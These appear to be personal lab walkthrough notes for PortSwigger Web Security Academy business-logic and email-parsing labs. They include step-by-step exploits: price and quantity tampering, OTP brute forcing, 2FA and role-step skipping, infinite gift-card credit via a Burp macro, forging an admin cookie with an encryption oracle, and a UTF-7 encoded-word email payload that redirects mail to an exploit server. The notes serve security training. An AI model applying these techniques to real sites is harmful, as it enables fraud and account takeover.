first lab 

1) login to wiener account 

2)capture the request that adds the jacket to the cart 

3)modify the price of the jacket in that request 
the request should look like this 

```python
productId=1&redir=PRODUCT&quantity=1&price=100
```

4)forward the request and go to the cart page to buy the jacket by 1$

second lab

1)attempt the normal login flow 

2)get to the otp code page and refresh it and capture the GET  request 

3)modify that request verify parameter to carlos instead of wiener 
the request will look like this 

```python
GET /login2 HTTP/2
Host: 0ad0008f03e5b4b582ad157e005f0047.web-security-academy.net
Cookie: verify=carlos; session=K3yZLOiTBgnJnGT95eBJ9xZw5l5AgPsY
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0ad0008f03e5b4b582ad157e005f0047.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

4)hit send (now you sent a code to carlos email 

5)capture the otp post request and send it to intruder with modified verify value of carlos and set the attack to sniper attack cuz you will try to brute force one parameter (the otp itself) since it's just 4 number 
set the payload to brute forcer and remove the character put only numbers and hit attack 

6)get the request with 302 code get to the response to that request and capture the session and paste it in your browser using inspect or using cookie editor extension
or simply right click then show response in browser

third lab 

1)login to ur account and capture the request of adding a product to your cart 

2)notice that you can change the quantity for a negative number (negative number means negative cost)

3)try to add negative items and the jacket to make the total price less than 100 $ 
$)then navigate to buy the jacket by a lower price

lab number five 

after some dirsearch and fuzzing you will find /admin page but only allowed for ppl with accounts ends with `@dontwannacry.com`

1)when you make an email with more that 255 characters it truncates the rest of the email in the website 

2)so what if you make an email with 255 characters ends with `@dontwannacry.com` then you put the rest of you email so it get truncated `(**@exploit-0afe008a0447bc84824c38b701e2006d.exploit-server.net)`**  

3)send the register request to intruder 
4)choose sniper attack go to payload choose character block and choose any litter min for 100 and max for example 1000 to test the sweet spot that it truncates the rest of the email at 

request should look like 

```python
POST /register HTTP/2
Host: 0abb009104d5bc4182ac393300f2003a.web-security-academy.net
Cookie: session=h7KRu1xu8aVGTuNnPnvklmNhVWIS3U7H
Content-Length: 142
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0abb009104d5bc4182ac393300f2003a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abb009104d5bc4182ac393300f2003a.web-security-academy.net/register
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=iKrL91IwO7mTMbxXjwDK4K18v6LJZlLG&username=test1&email=$attacker$%40exploit-0afe008a0447bc84824c38b701e2006d.exploit-server.net&password=test
```

![image.png](attachment:11d1d9dc-edaa-4300-97a6-941cac57abb0:image.png)

5)go to confirm the email for the longest email and log in with it 

6)you will find the my account page says 

```python
Your username is: test1

Your email is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

1. lets now make a mail with 255 chars ends with `@dontwannacry.com` and then **`@exploit-0afe008a0447bc84824c38b701e2006d.exploit-server.net` so that it send the confirmation email to my mail server (**it wont be actually shown to the server since it truncates the rest)
3. out mail wiil look like this  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@dontwannacry.com.**exploit-0afe008a0447bc84824c38b701e2006d.exploit-server.net**
4. once you confirm that mail using ur mail server cuz it says **`Displaying all emails @exploit-0afe008a0447bc84824c38b701e2006d.exploit-server.net and all subdomains`** and the email u just used is one of the subdomains and then login into the account you will find yourself as an admin

sometimes developers apply a very secure interface before you login for example for the registration form they have to confirm that this mail is your and etc 

but once you already registered do they still apply those rules?

this is the idea of lab 6

1)register with the attacker mail and confirm it 

2)once you're logged in try to update your email as an admin mail for example `test@dontwannacry.com` 

3)it wont confirm that mail and will be updated instantly

4)go to /admin page and delete carlos

some websites don't really care if all parameters of the request exist and this can cause a big problem
for example what if im trying to change the password and i simply didn't get asked for my current password, actually what if i can delete that current password parameter from the request itself so i simply just send whatever user name and the password i want to change it too (this can be fixed by making a secured csrf token even tho if ure able to remove that parameter you wont be able to change the password using different user token) this is exactly the idea of the next lab 

lab number seven 

1)log in to ur account 

2)try to change the password and capture that request

3)check removing the current password parameter and send the request with just the username and new password1/2 parameters 

4)figured out that it works without the current password parameter now what if i adjust the username to administrator user name in the same request and change the administrator password
request will look like this

```python
POST /my-account/change-password HTTP/2
Host: 0a7100df04b0a8f580bee005001c0045.web-security-academy.net
Cookie: session=SrSYtwKdUrOzd9kYwjcyVIlZGL091fZj
Content-Length: 98
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a7100df04b0a8f580bee005001c0045.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7100df04b0a8f580bee005001c0045.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=MhHEeiSfywiyNQrcLce5oq7NontSDevd&username=administrator&new-password-1=test&new-password-2=test
```

hit send and now you changed the admin password to a new password that you know

out in the wild you should test removing parameters and see how the website act if you remove different important parameters

does the request still get accepted?

does the website act differently?

what else can you change or remove?

lab number 8

simply go to forget password page send an email to the attacker mail 

go to reset password and capture the request of changing the password

it has a username parameter

change it to carlos and hit sent

it doesn't check if the token attacked to the same user asked for the reset password token

sometimes developers think that users will just follow the sequence they put for the user 
for example 

1)log in 

2)put your 2fa code 

3)then use the website

but not all users follow this sequence maybe they login and the go to the shop page or myaccount page
so developers should put some restrictions like after you logged in and then you try to navigate to the home page the website should ask first “did that user put the 2fa or not yet” if not it should redirect you to the 2fa page again 

lets solve lab 9 

1. login to wiener account and get to know how the mechanism work and get to know the directories names like /my-account 

2. login to carlos account the when it asks about the code simple add /my-account to the url 

3. find urself getting to carlos account page without using any 2fa codes 

this issue can also be used in e-commerce website for example 
you put an item in the cart then it checks for your credit then if it's valid it places your order 

but what if you get that request of check and then send it urself while you dont have enough credit to buy this item 

lab number 10

1)add an item cheaper than 100$ to you cart notice that when you place the order there's a request first gets send for the checkout looks like this 

```python
POST /cart/checkout HTTP/2
Host: 0a540093045bf6d581a23e29007e00da.web-security-academy.net
Cookie: session=wWwwC8ePXndVNYES29Cds7VP4anmRB0b
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a540093045bf6d581a23e29007e00da.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a540093045bf6d581a23e29007e00da.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=qJvlAJFCNC32r6JrHrJhJ8dquYJEUWQs

```

and then a GET request that checks your credit and makes the checkout and it looks like this 

```python
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a540093045bf6d581a23e29007e00da.web-security-academy.net
Cookie: session=wWwwC8ePXndVNYES29Cds7VP4anmRB0b
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a540093045bf6d581a23e29007e00da.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

what if simply you put an expensive item ‘the jacket’ and then send that confirmation request that only gets send with the items that you have enough money to buy 
2)send that request to the repeater we will neet it later

3)add the jacket to your cart 

4)go to repeater and resend that GET confirmation request and watch your cart gets a free checkout

sometimes it's about missing with the order sometimes when you skip some steps in the middle the website crashes or does a default settings for example 
a website asks you to log in and then after you login it asks you about yours role (user/author) what if you skip that step maybe it puts you as a default role which is an admin for example

lets solve lab number 11 

1)login into your account and notice theres first a post login request then a GET request to select-role page 

2)lets try to skip this step of selecting the role 

3)login to an account then turn on intercept and get that GET request and change its destination to empty slash (home page) 

so the request will be instead of something like this

```python
GET /role-selector HTTP/2
Host: 0aba000103cca05e8b084e5500ff00cd.web-security-academy.net
Cookie: session=sbkDZ3frC9NrUnXmpJ7n2U7Tg0ZMCOJ6
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0aba000103cca05e8b084e5500ff00cd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

it will be 

```python
GET / HTTP/2
Host: 0aba000103cca05e8b084e5500ff00cd.web-security-academy.net
Cookie: session=sbkDZ3frC9NrUnXmpJ7n2U7Tg0ZMCOJ6
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0aba000103cca05e8b084e5500ff00cd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

(or you can drop that request then navigate to the home url)
then it will redirect you to the home page with an admin role 

Domain-specific flaws

- domain-specific logic bugs = bugs tied to the business purpose (not generic vuln)
- common goldmine: discounting / price logic in e-commerce

example — discount abuse

1. shop gives 10% if order > $1000
2. attacker: add items until cart >= $1000 → discount applied
3. attacker: remove expensive items before checkout → still gets discount on lower total

what to look for / test checklist

1. where are values (price/discount/credit) calculated? client or server?
2. when is eligibility checked? (on add-to-cart / at checkout / on payment)
3. can you change cart after discount applied and keep discount? try: add → apply → remove → checkout
4. try removing/modifying parameters (price, quantity, promo_id) in requests and cookies
5. try forced browsing / replayed requests in different order (skip steps, repeat steps)
6. test negative/edge values (quantity = -1, price = 0)
7. check for server-side revalidation at final step (should always recalc eligibility on server at payment time)
8. watch for info leaks / error messages when app hits inconsistent state

attack thinking (brief)

- think what attacker gains (money, access, reputation)
- model attacker goals and find weird combos of features to reach them (e.g., cart + coupons + giftcards)
- domain knowledge helps — know what’s valuable in that app (social follow counts, credits, refunds, tiers)

so lets solve lab number 12

1)login to your account 

2)use the discount code NEWCUST5 

3)try to use it multiple times it doesn't work
4)scroll down in the home page and put an email to get the other discount code SIGNUP30

5)use it then use NEWCUST5 again and find out you can use discount code multiple times but not the same code in two sequential times 

6)use both the codes in an alternative way (code 1 then code 2 then code 1 then code 2 and so on)

lab number 13

1)figured out that i can buy a gift card with 10 dollars then put  SIGNUP30 code then buy that gift card with 7 dollars and then use it so now i got extra 3 dollars
what if we do this infinite number of time →  ill get infinite money 

2)you can do this manually but it won’t be practical to cover the jacket funds so let's do it using macros or a script

3)click on settings on the top right

4)choose session 

5)click add on **Session handling rules**

6)go to scope then click on include all URLS

7)get to details and click add on Rule actions and choose run a macro

8)then click add a  macro

9)then select those requests from you http history

```python
POST /cart
POST /cart/coupon
POST /cart/checkout
GET /cart/order-confirmation?order-confirmed=true
POST /gift-card
```

make sure that all requests are valid and maybe clear the http history before solving the lab to make it easy to find them (use ctrl and click on each request )

10)click ok then click on that request GET /cart/order-confirmation?order-confirmed=true then click on **Configure item**

11)click add to create a custom parameter. and name it `gift-card` (we are trying to make it use different gift card code for each request cuz each gift card you buy has different code so it need to fetch the code from the previous response of buying the giftcard and then use that giftcard code ) click **OK** twice to go back to the **Macro Editor**

12) now go to POST /gift-card and click configure item then click on the drawer btn next to gift-card and choose derive from prior response (means please use the gift card as a variable in each request and fitch its value from the previous request response) 

13)now test the macro and you should get all response codes as 302 but the get request as 200 (the checkout 203) if it's not make sure the lab session is not expired and you did everything right

14)no Keep clicking **OK** until you get back to the main Burp window.

15)Send the `GET /my-account` request to Burp Intruder (you get this request right after you use the gift card code) just in case you cant find it recreate it

16)go to intruder make it sniper attack clear all targets 

17)go to payloads make it **Null payloads**. Choose to generate `412` payloads.

18)go to  **Resource pool** click create custom resource pool check **Maximum concurrent requests** then set it to `1` 

19)hit attack and find yourself getting easy money on each refresh 

**Providing an encryption oracle:**

sometimes the token or the cookie is an encrypted value that associated with the user for example usermail:timestamp is the value of the cookie but it gets encrypted somehow by a key which mean it's secure cuz the user doesn't know the key but what if there's a functionality in the website that decrypt that value and convert it into raw text?

**Unix timestamp:** (also called **Epoch time** or **POSIX time**) is a numeric representation of time that counts the **number of seconds elapsed since January 1, 1970, 00:00:00 UTC** (the Unix epoch)

lab number13:

1)notice that once you clicked on stay logged in check you get a stay-logged-in cookie from now on

2)also notice that when you try to post a cooment with an invalid mail test mail=test  you get in the response a notification cookie that has the value of your error : Invalid email address: test
3)now go to the get request that shows the error it literally decrypt the value of the notification cookie and show you the error output

4)now try to replace that notification cookie in the get request with your stay-logged-in cookie value to figure out what the stay-logged-in cookie consists of now the notification header in the response of the GET /post?postId=x request is  wiener:1761219090308   so you found out that the stay-logged in cookie look like `username:timestamp` for each user

5)now we have a request that encrypt the value of the comment and give you the cookie after (POST /post/comment) and another request that dencrypts this value (GET /post?postId=x) lets now try to guess the administrator stay-logged-in token using those two requests 

6)since the timestamp doesn't change and it's a known number so i guess that admin cookie looks like  administrator:1761219090308 so now i want to get the encryption of that value 

7)in the comment mail section put mail=administrator:1761219090308 and take the notification token in the response and use it in the decryption request (GET /post?postId=x) find the output = `Invalid email address: administrator:1761219090308` so now i literally have that admin stay logged in cookie but it has additional `Invalid email address:` (23chars) that i dont want so i need to figure out how to remove it 
8)go in Decoder, URL-decode and Base64-decode the cookie, switch to the message editor's "Hex", and Select the first 23 bytes, then right-click and select "Delete selected bytes".

9)try to decrypt that value using the  (GET /post?postId=x) you will get an error says : the input length must be a multiple of 16

10)now add enough characters before the `administrator:1761219090308` to make it multiple of 16 now the decryption looks like : Invalid email address: xxxxxxxxxadministrator:1761219090308

11)now we need to remove those chars Invalid email address: xxxxxxxxx = 32 character first two rows and we will get the pure administrator:1761219090308 encryption without the noise 
12) go to Decoder  URL-decode and Base64-decode the cookie then delete the first 2 rows  the encode it as base 64 and url encode it and check the value from the decryption request 

13)now you have the administrator stayloggedin cookie use it to visit home page and intercept then add that cookie

# Splitting the email atom

### Logic behind the attack

1. websites use libraries to parse/validate emails (frontend)
2. actual mail servers (postfix/sendmail) use different logic to route emails (backend)
3. if you find a discrepancy between them, you can trick the website into thinking an email is for `target.com` but the mail server sends it to `attacker.com`

### technique 1: special characters (UUCP & Source Routing)

1. ancient protocols use characters like `!` or `%` to route emails
2. sendmail treats `!` as a separator (UUCP protocol)
3. if you register with `!#$%&'*+\/=?^_`{|}~-collab@psres.net`
4. parser thinks it's a weird but valid local user
5. sendmail sees the `!` and routes it differently
6. same thing with `()` -> `collab%psres.net(@example.com`
7. postfix ignores what's in `()` so it routes based on the `%` hack to `psres.net`

### technique 2: unicode overflows

1. backend sometimes uses `chr()` function which limits characters to 256 (0-255)
2. what if you send a character with value 320?
3. math happens: 320 - 256 = 64
4. 64 is the ascii code for `@`
5. so `String.fromCodePoint(0x100 + 0x40)` becomes `@`
6. you can use this to smuggle blocked characters like `@` or `.` past the input validation, then they "overflow" into valid chars on the backend

### technique 3: encoded-word (the big one)

1. email standards allow encoded text like `=?utf-8?q?hello?=`
2. figured out that some libraries (like Ruby's Mail gem) decode this **inside** the email address
3. you can hide malicious chars inside the encoding
4. **Github/Zendesk exploit:**
    - make an email that looks like `=?x?q?...?=@target.com`
    - inside the `...` put encoded null bytes or `@` signs
    - website sees `@target.com` so it trusts you
    - backend decodes the first part, hits the null byte or the smuggled `@`, and routes email to your server instead
5. this allowed bypassing access controls that rely on domain names (like "sign up only if email ends in @company.com")

### technique 4: punycode & RCE

1. punycode is used for international domains (starts with `xn--`)
2. found a bug in PHP's IDN library where specific punycode sequences decode to malicious ascii chars like `<` or `>` or `"`
3. **Joomla exploit:**
    - register with a malicious punycode email
    - Joomla renders it on the page
    - library decodes it into `<style>` tag (HTML injection)
    - use CSS injection to steal the admin's CSRF token
    - use token to upload shell -> RCE

### what to look for

- try injecting `!` `%` or `()` in the email field
- try using `encoded-word` syntax `=?utf-8?q?test?=`
- if the application is built on Ruby, it's highly susceptible to the encoded-word attack
- if it's PHP, check for punycode decoding issues
- always check if you can bypass "company only" registration forms using these tricks

now lets solve 

**Lab: Bypassing access controls using email address parsing discrepancies:**

1)first i went to register page trying to make an account with my exploit server mail and it got blocked, cuz it only passes accounts end with `ginandjuice.shop` in normal conditions i would try to insert my account using burp to bypass the frontend instructions but this is not the case

2) now We need to trick this validator into thinking we are using a company email, while tricking the backend mailer into sending the email to us.

so lets try the Encoded-Word method as we explained before, tried to put smth like `=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop`

or `=?utf-8?q?=61=62=63?=foo@ginandjuice.shop`

and it got blocked too 

if it worked then it means that UTF-8 can bypass this restriction so we would simply put this in the mail section `=?utf-8?q?attacker=40exploit-0a17009304a9791b81c30bb9013600d6.exploit-server.net=20?=@ginandjuice.shop`

but this is not the case

3)then since UTF-8 didn't work i tried UTF-7 

sent smth like `=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop`

found it didn't trigger an error which means it doesn't block UTF-7 encoding

since utf-7 is accepted lets now inject our email to make the backend send the mail to our exploit mail server 
it will look like

```python
=?utf-7?q?attacker&AEA-exploit-0a17009304a9791b81c30bb9013600d6.exploit-server.net&ACA-?=@ginandjuice.shop
```

so let's dive more into this payload 

**`=?`** says like "Hey Server, I'm starting an encoded word!"

**`utf-7`** -> "The language is UTF-7."

**`?q?`** -> "I'm using Q-encoding."

**`attacker...`** -> "Here is the data."

**`?=`** -> "End of encoded word."

`&AEA-` in UTF-7 decodes to `@`.

`&ACA-` in UTF-7 decodes to  `` (a Space).

and after that space the rest of the value which has the `@ginandjuice.shop` gets ignored from the backend and the mail gets sent to our exploit mail server 

**The Split:**

- **Validator:** Sees `@ginandjuice.shop` at the end -> **PASS**.
- **Mailer:** Decodes to `attacker@exploit-server.net [Space] @ginandjuice.shop`.
- The **Space** cuts off the address. Mail goes to `attacker@exploit-server.net`.

4)check the exploit server activate ur mail and then login into it and delete carols account
